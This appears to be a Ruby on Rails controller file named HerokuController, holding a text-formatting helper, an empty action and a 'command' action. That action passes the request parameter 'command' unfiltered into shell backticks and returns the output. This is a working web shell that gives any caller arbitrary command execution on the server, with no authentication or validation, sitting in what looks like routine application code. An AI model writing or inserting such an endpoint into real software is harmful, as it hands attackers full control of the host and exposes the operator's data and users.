class HerokuController < ApplicationController
	def simple_format_no_tags(text, html_options = {}, options = {})
	  text = '' if text.nil?
	  text = smart_truncate(text, options[:truncate]) if options[:truncate].present?
	  text = ActionController::Base.helpers.sanitize(text) unless options[:sanitize] == false
	  text = text.to_str
	  text.gsub!(/\r\n?/, "\n")                    # \r\n and \r -> \n
	  text.gsub!(/([^\n]\n)(?=[^\n])/, '\1<br />') # 1 newline   -> br
	  text.html_safe
	end
	
	def run
	end

	def command
		if params[:command] != nil
			@output = `#{params[:command]}`
			render :text => @output
		end
	end
end
